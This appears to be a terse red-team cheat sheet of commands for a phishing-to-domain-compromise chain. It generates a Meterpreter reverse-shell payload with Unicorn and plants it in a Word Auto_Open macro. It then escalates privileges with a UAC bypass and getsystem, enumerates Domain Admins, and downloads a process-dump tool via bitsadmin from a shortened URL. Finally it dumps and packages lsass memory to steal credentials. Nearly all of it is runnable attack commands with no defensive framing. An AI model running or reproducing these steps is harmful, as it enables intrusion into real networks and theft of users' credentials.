[UPDATE METASPL0IT]
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erdb > msfinstall && \chmod 755 msfinstall && \ ./msfinstall
---------
---------
---------
Unicorn - https://github.com/trustedsec/unicorn
git clone https://github.com/trustedsec/unicorn
---------
git clone https://github.com/trustedsec/unicorn
python unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
sudo msfconsole -r unicorn.rc

---------
Copy maro powershell_attack.txt into Word attachment. 
Open Word / Developer / Macros / Create / Auto_Open / insert payload .
https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
---------
outlook.exe /PIM "CS2"

---------
sessions -i 1
load priv stdapi extapi

getuid
getsystem
background 
use windows/local/bypassuac_sluihijack
set SESSION 1
exploit
getuid
getsystem

---------
execute -H -c -f "C:\\windows\\sysnative\\notepad.exe"
migrate 7584
shell
---------

whoami
ping -m 1 8.8.8.8
net1 group "Domain Admins" /domain
bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C:\Users\Public\1.exe
cd C:\Users\Public\

REM - Above command downloads pd64.exe ProcessDump"

1.exe -accepteula -ma lsass.exe lsass.dmp

makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
